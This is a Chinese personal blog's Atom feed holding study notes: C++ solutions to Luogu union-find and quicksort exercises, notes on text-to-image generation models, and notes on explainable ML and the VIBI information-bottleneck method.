<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BeautyFlower</title>
  
  <subtitle>欢迎来到米奇淼淼屋</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-10-09T04:01:17.710Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>yyyyyyxnp</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>luogu_1</title>
    <link href="http://example.com/post/9c1a1a1.html"/>
    <id>http://example.com/post/9c1a1a1.html</id>
    <published>2024-10-08T10:50:27.000Z</published>
    <updated>2024-10-09T04:01:17.710Z</updated>
    
    <content type="html"><![CDATA[<p>实践证明如果是要准备机试，只练leetcode是完全不够的！(╯▔皿▔)╯</p><span id="more"></span><h1 id="模板并查集">【模板】并查集</h1><h2 id="题目描述">题目描述</h2><p>如题，现在有一个并查集，你需要完成合并和查询操作。</p><h2 id="输入格式">输入格式</h2><p>第一行包含两个整数 <span class="math inline">\(N,M\)</span> ,表示共有<span class="math inline">\(N\)</span> 个元素和 <span class="math inline">\(M\)</span> 个操作。</p><p>接下来 <span class="math inline">\(M\)</span> 行，每行包含三个整数<span class="math inline">\(Z_i,X_i,Y_i\)</span> 。</p><p>当 <span class="math inline">\(Z_i=1\)</span> 时，将 <span class="math inline">\(X_i\)</span> 与 <span class="math inline">\(Y_i\)</span> 所在的集合合并。</p><p>当 <span class="math inline">\(Z_i=2\)</span> 时，输出 <span class="math inline">\(X_i\)</span> 与 <span class="math inline">\(Y_i\)</span> 是否在同一集合内，是的输出<code>Y</code> ；否则输出 <code>N</code> 。</p><h2 id="输出格式">输出格式</h2><p>对于每一个 <span class="math inline">\(Z_i=2\)</span>的操作，都有一行输出，每行包含一个大写字母，为 <code>Y</code> 或者<code>N</code> 。</p><h2 id="题解">题解</h2><p>对于此种频繁进行合并集合的要求，使用并查集可加快效率，即同一集合的两个数字的根父节点应相同</p><p>step1：每个数字的初始父节点为其本身</p><p>step2：需要合并两个数字时，首先寻找两个数字的根父节点，如果不同，就将其中一个根父节点的父节点更改为另一个的父节点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parent[<span class="built_in">find_p</span>(x)] = <span class="built_in">find_p</span>(y)</span><br></pre></td></tr></table></figure><p>step3：判断两个数字是否属于同一集合，就是判断其根父节点是否相同</p><h2 id="代码">代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; parent;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find_p</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(parent[x] != x)&#123;</span><br><span class="line">        x = parent[x];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">union_p</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> p_x = <span class="built_in">find_p</span>(x);</span><br><span class="line">    <span class="type">int</span> p_y = <span class="built_in">find_p</span>(y);</span><br><span class="line">    <span class="keyword">if</span>(p_x != p_y)&#123;</span><br><span class="line">        parent[p_x] = p_y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    parent.<span class="built_in">resize</span>(n + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        parent[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="type">int</span> z, x, y;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;z, &amp;x, &amp;y);</span><br><span class="line">        <span class="keyword">if</span>(z == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">union_p</span>(x, y);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">find_p</span>(x) != <span class="built_in">find_p</span>(y))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;N\n&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Y\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="模板排序">【模板】排序</h1><h2 id="题目描述-1">题目描述</h2><p>将读入的 <span class="math inline">\(N\)</span>个数从小到大排序后输出。</p><h2 id="输入格式-1">输入格式</h2><p>第一行为一个正整数 <span class="math inline">\(N\)</span>。</p><p>第二行包含 <span class="math inline">\(N\)</span> 个空格隔开的正整数<span class="math inline">\(a_i\)</span>，为你需要进行排序的数。</p><h2 id="输出格式-1">输出格式</h2><p>将给定的 <span class="math inline">\(N\)</span>个数从小到大输出，数之间空格隔开，行末换行且无空格。</p><h2 id="思路">思路</h2><p>快速排序（前序遍历思想），首先选择一个枢轴，将数组分为前中后三部分，前为小于枢轴部分，中为等于枢轴部分，后为大于枢轴部分，然后分别再对前部分和后部分进行快速排序</p><h2 id="代码-1">代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> b[<span class="number">100001</span>], m[<span class="number">100001</span>], l[<span class="number">100001</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> e, vector&lt;<span class="type">int</span>&gt; &amp;a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s &gt;= e) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 随机选择一个枢轴并交换到起始位置</span></span><br><span class="line">    <span class="type">int</span> pivot_index = s + <span class="built_in">rand</span>() % (e - s + <span class="number">1</span>);    </span><br><span class="line">    <span class="type">int</span> q = a[pivot_index];</span><br><span class="line">    <span class="type">int</span> b_i = <span class="number">0</span>, m_i = <span class="number">0</span>, l_i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = s; i &lt;= e; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i] &gt; q) b[b_i++] = a[i];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i] &lt; q) l[l_i++] = a[i];</span><br><span class="line">        <span class="keyword">else</span> m[m_i++] = a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> a_i = s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; l_i; i++) a[a_i++] = l[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m_i; i++) a[a_i++] = m[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; b_i; i++) a[a_i++] = b[i];</span><br><span class="line">    <span class="built_in">quick_sort</span>(s, s + l_i - <span class="number">1</span>, a);</span><br><span class="line">    <span class="built_in">quick_sort</span>(e - b_i + <span class="number">1</span>, e, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">quick_sort</span>(<span class="number">0</span>, n - <span class="number">1</span>, a);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a.<span class="built_in">back</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;实践证明如果是要准备机试，只练leetcode是完全不够的！(╯▔皿▔)╯&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="c" scheme="http://example.com/tags/c/"/>
    
    <category term="c++" scheme="http://example.com/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>T2I</title>
    <link href="http://example.com/post/7684f23b.html"/>
    <id>http://example.com/post/7684f23b.html</id>
    <published>2024-09-23T06:17:27.000Z</published>
    <updated>2024-09-28T16:17:26.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="framework">Framework</h3><p><img src="/post/7684f23b/1727072275056201.png" alt="img" style="zoom:33%;"></p><span id="more"></span><h3 id="类型">类型</h3><ol type="1"><li>Text -&gt; 生成式AI -&gt; video/image</li><li>Image -&gt; 生成式AI -&gt; text</li><li>Image -&gt; 影像完善/风格转换/质量提升 -&gt; new image影像生影像</li><li>Voice + image -&gt; 生成式AI -&gt; video talking head</li></ol><h3 id="基础要点">基础要点</h3><p>Image -&gt; consisted of patches(像素点, eg:1024 * 1024) video -&gt;consisted of frame(eg: frame per second -&gt; FPS)</p><p>高精度图像要点：一些影像压缩技术</p><p>对于图片：</p><p><img src="/post/7684f23b/1727072275054175.png" alt="img" style="zoom:50%;"></p><p>对于视频：</p><p><img src="/post/7684f23b/1727072275054176.png" alt="img" style="zoom:50%;"></p><h5 id="方法">方法</h5><p>文字生图需要大量训练资料，有网站提供大量图片文字对，因此文字生图主要目标可理解为：</p><p>输入：文字 ----&gt; 输出：patches</p><ol type="1"><li>One method is generating patchsequently(auto-regressive)，很少用，patch之间不是依次传递作用:</li></ol><p><img src="/post/7684f23b/1727072275054177.png" alt="img" style="zoom:33%;"></p><ol type="1"><li>进化方式：同时生成patch，难以避免patch之间衔接不够，假如目标是生成一只小狗，这种方式可能导致各个patch的目标都是生成小狗，导致最终图像混乱，或者各个patch之间的杂序未统一，同一张图出现风格不同</li></ol><p><img src="/post/7684f23b/1727072275054178.png" alt="img" style="zoom:33%;"></p><ol type="1"><li>对于一些有独特特点的图片，比如一定要包含某个无法用语言完全描述的物品时，可使用个人化的图像生成，加入到图像生成中<ol type="1"><li><img src="/post/7684f23b/1727072275054179.png" alt="img" style="zoom:33%;"></li></ol></li><li>文字生影片，方法和上面第二点相似，传入的即为P1.1P1.2，生成的也还是patches，多个patches可组成一个frame<ol type="1"><li><p>挑战：假设FPS为24，image为64*64，1分钟有1440个frame，600w个patch</p></li><li><p>每两个patch之间都相互考虑做attention，需要600w * 600w-&gt;36兆次attention</p></li><li><p>Temporal attention:不同frame中相同位置的patch才做attention -&gt;1440^2 * (64*64) -&gt; 85亿次attention</p></li><li><p>Spatial attention:同一个frame中所有的patch才做attention -&gt;(64<em>64)^2 </em> 1440 -&gt;240亿次attention</p></li></ol></li></ol><h5 id="衡量方式">衡量方式</h5><ol type="1"><li><strong>clip score</strong>:contrastive language-Imagepre-training:有400million的text-image对，方法如下，正确配对-&gt;高分，错误配对-&gt; 低分，正确样本为官方数据，负样本为随机打乱text-image对</li></ol><p><img src="/post/7684f23b/1727072275054180.png" alt="img" style="zoom:33%;"></p><ol type="1"><li><strong>FID:</strong> 先有一个pretrain好的cnnmodel，用于影像分类，将真实的latent representation和生成图片的latentrepresentation进行比较（需要大量样本）</li></ol><p><img src="/post/7684f23b/1727072275054181.png" alt="img" style="zoom:50%;"></p><h3 id="经典方法">经典方法</h3><h5 id="variational-auto-encodervae">Variational Auto-Encoder(VAE)</h5><ul><li>挑战：一张image由多个patch组成，patch之间虽然能用attention相互影响，无法避免patch之间风格不一致，无法统一(因为model本身就需要联想)</li><li>解决方案：添加标注，即资讯<ul><li><p><img src="/post/7684f23b/1727072275054182.png" alt="img" style="zoom:50%;"></p></li><li><p>模型训练（将资讯抽取和图像生成一起进行训练优化，先根据图像生成资讯/标注，再根据标注生成图像，尽量使得生成的image和原始的image足够相似），该过程称之为auto-encoder</p></li><li><p><img src="/post/7684f23b/1727072275054183.png" alt="img" style="zoom:50%;"></p></li><li><p>图像生成时标注是随机生成并加入到图像生成的模型中，最终生成图片，因为抽取的标注一般不为文字，而是向量，不同位置数字代表不同信息，因此真实生成图片是标注可随机产生，即随机确定风格</p></li></ul></li><li>进阶使用<ul><li>在通过encoder获取到的标注可以自行增减向量，比如原始图片为笑脸，可在生成的标注中减去笑脸向量，加上臭脸向量，在生成图片，最终生成的图片即为臭脸</li></ul></li></ul><h5 id="flow-based">Flow-based</h5><ul><li>要点：和VAE类似，不同之处在于，Flow将资讯抽取当作图像生成的反过程，即VAE中的Encoder为Decoder^-1，这就要求Decoderf函数要有反函数<ul><li><img src="/post/7684f23b/1727072275054184.png" alt="img" style="zoom:50%;"></li></ul></li></ul><h5 id="diffusion">Diffusion</h5><ul><li>模型框架（分为forward和reverse两部分）<ul><li><img src="/post/7684f23b/1727072275055185.png" alt="img" style="zoom:50%;"></li></ul></li><li>Reverse Process：Noise image为随机生成的和targetimage尺寸一致的噪声图片，step后面的数字是和Forward过程相对应的，该图相当于做了1000次的Denoise，目的是一步步过滤掉noiseimage中的噪声<ul><li><p><img src="/post/7684f23b/1727072275055186.png" alt="img" style="zoom:50%;"></p></li><li><p>Denoise细节：由于每一步传入的image噪声程度不同，即随着不断地Denoise，图片的噪声会不断减少，因此添加新的输入用于表示noise严重程度</p><ul><li><p>另外Denoise的方法是先为输入的noiseimage生成一个纯noise，再将输入的noiseimage减去预测出的noise，最终得到该步的输出</p></li><li><p><img src="/post/7684f23b/1727072275055187.png" alt="img" style="zoom:50%;"></p></li></ul></li></ul></li><li>Forward Process(diffusion model)：即Noisepredictor训练过程，首先将一张干净的图不断的加噪声，最终生成一张noiseimage<ul><li><p><img src="/post/7684f23b/1727072275055188.png" alt="img" style="zoom:33%;"><img src="/post/7684f23b/1727072275055189.png" alt="img" style="zoom:33%;"></p></li><li></li><li><p>然后将数据用于noisepredictor训练，这里的2是noise程度，即image2-noise2 =image1，达到上面的reverse效果</p></li></ul></li><li>结合text：即denoise增加输入text，相应的forward过程也要加入text<ul><li><img src="/post/7684f23b/1727072275055190.png" alt="img" style="zoom:50%;"></li></ul></li><li>完整框架<ul><li><img src="/post/7684f23b/1727072275055191.png" alt="img" style="zoom:50%;"></li></ul></li><li>训练<ul><li><p>noise predictor过程(forward)</p><ul><li><p><img src="/post/7684f23b/1727072275055192.jpeg" alt="img" style="zoom: 33%;"><img src="/post/7684f23b/1727072275055193.jpeg" alt="img" style="zoom:33%;"></p></li><li></li></ul></li><li><p>reverse过程</p></li><li><p><img src="/post/7684f23b/1727072275055194.jpeg" alt="img" style="zoom:33%;"><img src="/post/7684f23b/1727072275055195.jpeg" alt="img" style="zoom:33%;"></p></li><li></li><li></li></ul></li></ul><p>实际上的noise是一次性直接生成的，而不是逐步添加杂序</p><ul><li>代码细节：<ul><li><p>怎么衡量outputimage和真实image之间的接近度-&gt;最大似然估计，即输出图片为预期图片的概率的乘积最大的网络参数</p></li><li><p><img src="/post/7684f23b/1727072275055196.jpeg" alt="img" style="zoom:33%;"></p></li><li><p>首先看VAE过程，目标是最小化输出G(z)和目标x之间的差距，然后找logP(x)的下界</p></li><li><p><img src="/post/7684f23b/1727072275055197.jpeg" alt="img" style="zoom:33%;"></p></li><li><p>类似的DDPM过程，确定logP(x)的下界</p></li><li><p><img src="/post/7684f23b/1727072275055198.jpeg" alt="img" style="zoom:33%;"></p></li><li><p>计算过程</p></li><li><p><img src="/post/7684f23b/1727072275056199.jpeg" alt="img" style="zoom:33%;"></p></li></ul></li></ul><h5 id="gan可作为一种外挂即vaegan-flowgan-diffusiongan">GAN(可作为一种外挂，即VAE+GAN,Flow+GAN, Diffusion+GAN)</h5><p>和其他模型有本质区别(Discriminator来衡量生成图像的好坏，类似于clip)</p><p>训练方式：搜集大量的image-textpair作为正样本，准备一个不好的文生图模型，将text和生成的image配对作为负样本</p><img src="/post/7684f23b/7684f23b/1727072275056200.png" class title="img">]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;framework&quot;&gt;Framework&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/post/7684f23b/1727072275056201.png&quot; alt=&quot;img&quot; style=&quot;zoom:33%;&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Explainable_ML</title>
    <link href="http://example.com/post/e4cc0182.html"/>
    <id>http://example.com/post/e4cc0182.html</id>
    <published>2024-09-23T06:15:08.000Z</published>
    <updated>2024-10-08T10:55:39.849Z</updated>
    
    <content type="html"><![CDATA[<h4 id="explainable-ml">Explainable ML</h4><p>产生原因：预测正确 !=模型有效，即<strong>希望模型能给出预测结果的支撑原因</strong>，深度神经网络对我们是一个黑盒结构，不能直接解释其结果</p><span id="more"></span><h5 id="interpretable-vs-powerful">Interpretable vs powerful</h5><p>成反比，越简单的模型解释性越强，能力越差 eg：linearmodel，每一个权重都有独特的含义，可用于支撑结果</p><p>越复杂的模型解释性越差，能力越强 eg：deep neural(black box)</p><blockquote><p>Explainable: which is a black box, to give it the capacity forexplaining</p><p>Interpretable: which is not a black box, we can gain itsinterpretation</p></blockquote><h5 id="suitable-choice">Suitable choice</h5><p>决策树：比线性模型能力更强，比深度神经网络更好解释。每一个节点都对应不同的问题（即特征）</p><p><strong>但是</strong>，实际场景中，决策树用于随机森林，由多个决策树组成，难以确认模型如何确定结果</p><h5 id="type">Type</h5><ul><li>Local explaination:即本论文所介绍的方式，即针对单个样本的解释（eg：为什么识别出图片a是数字1）<ul><li>方法1：移除图片单个component，确定哪个component会影响预测结果（<strong>缺点</strong>：component过多的时候过于复杂）</li><li>方法2：计算梯度：原始样本X={x1,x2,...xn...xN}---&gt;X={x1,x2,...xn+▲x,...xN}，Jloss`= Jloss + ▲e,xn的重要性为|▲e/▲x|，我们能获得一张saliencymap，每一个node代表了其重要性（<strong>缺点1</strong>：不可避免的噪声，即重点不突出，存在过多的"杂质"(用smoothGrad,对输入图片加噪声，计算map平均值)，<strong>缺点2</strong>：梯度并不能总是反映重要性，即存在这种情况：when x--&gt;[0,x'],梯度大，when x--&gt;[x',+∞]，梯度小，无法确定该特征是否影响结果）</li></ul></li><li>Globalexplaination：即针对预测结果的解释（eg：什么样的图片会被识别出为数字1）<ul><li>方法1：生成一个样本，希望模型识别出我们想要的效果（样本即为待优化参数）</li><li>方法2：计算梯度上升点，但是生成的样本很有可能不符合预期（过多杂质）</li><li>方法3：use a generator：input-Z(low-dim), X = G(Z), Y = D(X),目标是min(y,yi)</li></ul></li></ul><h5 id="more-info">More info</h5><p>提升深度神经网络的可解释性是有挑战的，一种方式是训练一个更简单的解释模型(eg：linear)来模仿原始模型，确定哪些特征对模型结果产生重要影响（LIME）</p><h4 id="information-bottleneck-theory">Information bottlenecktheory</h4><ul><li>互信息<ul><li>信息熵概念：每一件信息（事件）都有其价值，eg:从多个候选中选择答案，如果是两个候选者，选中的概率是1/2(只需要询问一次就可以获得结果，I= 1)，如果是四个候选者，选中的概率是1/4(要询问两次获得结果，I =2)，如果是八个候选者，选中的概率是1/8(要问三次获得结果，I =3)，因此一条信息的价值I近似为I =-log2(P)，概率越大，信息价值越小，概率越小，信息价值越大，也可称为不确定性。<ul><li>信息熵就是I的期望，H =ΣI*P，如果一个系统是由大量小概率事件组成，其信息熵越大，代表其不确定性越大1</li></ul></li><li>联合熵概念：X和Y并不独立，I(xi, yj) = -log2(P(xi, yj))，H(X,Y) =-ΣΣP(xi, yj) * log2(P(xi, yj))<ul><li>条件熵概念：H(X|Y)：在Y事件发生后，X事件的不确定性，即X和Y的联合熵减去Y事件本身的信息熵，就是Y发生前提下，X事件发生带来的新信息熵，H(X|Y)= H(X, Y) - H(Y)</li></ul></li><li>互信息概念（I(X; Y)）:I(X; Y) = H(X) - H(X|Y) = ΣP(x, y) * log2(P(x,y)/(P(x) *P(y)))，即X本身的信息熵减去Y发生后X发生带来的新的信息熵，就是X和Y的联合信息，通常来说，Y确定后，X的不确定性越大，X与Y的互信息就越少；Y确定后X越确定，X越Y的互信息越大</li></ul></li><li>信息瓶颈理论：将神经网络视为一个encoder（X-&gt;Z）+decoder(Z-&gt;Y),目标是min(I(Z;X) - β*I(Z; Y)),目标参数是P(Z|X)，即找到最合适的Z，最小化Z和X之间的互信息，最大化Z和Y的互信息，<strong>主要思想：</strong>将多层神经网络是为逐层传递的马尔科夫链，信息在链中被逐层压缩，去掉和输出无关的，留下和输出相关的。也就是说每一层与模型输入的互信息在逐渐减少，与模型输出的互信息逐渐增大</li><li>马尔科夫链：在当前条件确定情况下，未来的情况发生只取决于当前情况，和过去独立(I(X;Y|Z) = 0)</li><li>KL散度：小概率事件包含着更大的信息价值，熵是指一个概率分布的平均信息量，用于衡量不确定性，交叉熵就是给定估计的分布概率q（预测出的）,假设真的发生的分布概率是p,交叉熵H(p, q) = Σ pi *I(qi)，也就是真实发生的概率乘以估计的分布概率的价值，KL散度就是一种衡量真实熵和交叉熵之间的差距的方式：D(p||q)= H(p, q) - H(p) = Σpi*log(pi)/qi<ul><li>KL散度大于等于0，只有当p=q等号成立</li><li>D(p||q) != D(q||p)</li><li>通常使用crossentropy作为损失函数，因为我们损失函数的目的最终是梯度下降，▽D(p||qΘ)= ▽ΘH(p, q) - ▽ΘH(p) = ▽ΘH(p, qΘ)</li><li>散度越小，概率越接近</li></ul></li></ul><h4 id="vibilocal-explaination">VIBI(Local Explaination)</h4><p>目标是既要能充分解释，又要足够简介</p><p>方法——explainer(返回每个样本被选择的概率Z,输出为T(X)=Zj*Xi)+approximator（根据解释器的输出T，模仿真实模型预测结果对模型进行训练）</p><p>现有方法——1. 针对特别的模型所构建的explainer，比如background和CNN2.针对所有模型都可以（提供一个模型近似器）</p><h5 id="method">Method</h5><p>原始的信息瓶颈目标公式为 P(t|x) = argmax I(t; y) - β *I(x;t)(待优化变量：p(t|x), p(y|t), p(t))</p><p>优化目标公式为P(Z|X) = argmax(p(z|x), p(y|t)) I(t; y) - β * I(X;t)（没有p(t)的原因我猜测是因为在原始马尔科夫假设中，p(t)是表示t的边际分布，捕捉了所有可能的表示分布，但是在VIBI中，通过explainer得到了一个更具体的表示t，因此p(t)被具体的选择过程p(z|x)取代，即t由解释器P(z|x)优化，不需要再单独优化</p><p><strong>难点</strong>：I(x; t)和I(y;t)难以直接确认，联合分布维数过高，计算代价大</p><p>首先可确定的是I(x; t)小于I(x; Z) +c(信息在传递过程是递减的，t由z和x联合计算得到，t所包含的信息是由z和x共同传递，因此t和x的信息量小于x和z的互信息量)，推理过程如下，由此，以上公式下界为以下，目标就是最大化以下</p><p>其中先验分布为均匀分布（1/length），原因如下：</p><ol type="1"><li>均匀分布假设每个特征都有相同的概率被选择，即每个特征在初始状态下是等价的。这种分布可以被视为对模型没有特定偏见的表示，保留了特征之间的潜在信息。如果使用全零向量作为先验，这意味着你假设所有特征的选择概率都是零，或者说你假设特征在初始状态下都没有信息价值。这样做会导致KL散度的值很大，因为<code>log_p_i</code>会与这个全零先验产生极大的差异，模型可能难以有效训练。</li><li>在反向传播时，均匀分布能提供一个合理的梯度，使得<code>log_p_i</code>在训练过程中逐步调整，向更有意义的特征分布靠近。因为均匀分布给出的梯度不是极端的，所以有助于稳定训练。使用零向量可能会导致梯度的极端值，尤其是在KL散度的计算中。极端的梯度可能会导致训练过程中的数值不稳定，甚至梯度爆炸或消失，阻碍模型的正常学习。</li><li>使用均匀分布作为先验，可以让模型从一个中立的起点开始学习，即假设每个特征最初都具有相同的重要性。这使得模型在初期阶段不会对某些特征产生偏见，从而增强了模型的泛化能力。如果使用全零向量，模型可能会被迫从一个不合理的假设出发，这可能导致过度依赖某些特征或无法充分利用所有可用信息。这样可能削弱模型的泛化能力，并导致较差的性能。</li><li>均匀分布先验的假设更接近现实，因为在很多情况下，我们事先并不知道哪些特征更重要，所以均匀分布提供了一个自然的起点，减少了模型的先验偏差。零向量通常假设所有特征在初始时都是无效的，这在很多实际场景中是不合理的，可能会导致训练初期模型学习非常缓慢甚至无法学习。</li></ol><p><img src="/post/e4cc0182/172707213427358.jpeg" alt="img" style="zoom:33%;"><img src="/post/e4cc0182/17270721342641.jpeg" alt="img" style="zoom:33%;"></p><p><strong>难点</strong>：Pj(x) = P(zj,x)，encoder得到的是Pj(x)，要如何确定Z的值？这里的Z可看作是一个二进制列表，为1代表该块选中，实际上不能通过公式得出zj的值，我们可以通过概率进行随机采样，即使用argmax找到使得概率最大化的zj，但是argmax不可导，gumble-softmax的目标是生成一个以P为参数的公式，公式返回的结果是Z采样的结果，以便于对Z的选择可实现对P微分，可反向传播</p><p>即以连续分布去近似离散部分，softmax在一定程度上可近似argmax函数（当τ接近0时，<code>softmax</code>的输出近似于一个one-hot向量，其中某一个元素接近1，其余接近0，这与<code>argmax</code>的输出一致。）</p><p>具体方法分为两步 1.为每个类别添加噪声（添加随机性，概率低也有可能被选中） 2.对加噪结果应用softmax，使得结果接近原始类别分布</p><p><img src="/post/e4cc0182/17270721342652.jpeg" alt="img" style="zoom:50%;"></p><p>根据采样次数进行合并得到Z，我认为是每一次都相当于模拟一个one-hot，要找k个，就计算出k个one-hot,合并就得到最终结果，因此</p><img src="/post/e4cc0182/e4cc0182/17270721342663.png" class title="img"><p>最终的目标函数</p><img src="/post/e4cc0182/e4cc0182/17270721342664.png" class title="img"><h4 id="实验">实验</h4><p>实验概述：训练出一个识别MNIST手写数字的模型A，查找最影响结果的输入X的四个块</p><p>对比实验设计：不进行采样（进行采样获取）和进行采样（直接选择k个概率最大的块）</p><p>Same digit, different angles.</p><img src="/post/e4cc0182/e4cc0182/17270721342665.png" class title="img"><img src="/post/e4cc0182/e4cc0182/17270721342676.png" class title="img"><img src="/post/e4cc0182/e4cc0182/17270721342677.png" class title="img"><img src="/post/e4cc0182/e4cc0182/17270721342678.png" class title="img"><img src="/post/e4cc0182/e4cc0182/17270721342689.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213426810.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213426811.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213426812.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213426913.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213426914.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213426915.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213426916.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213426917.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213426918.png" class title="img"><img 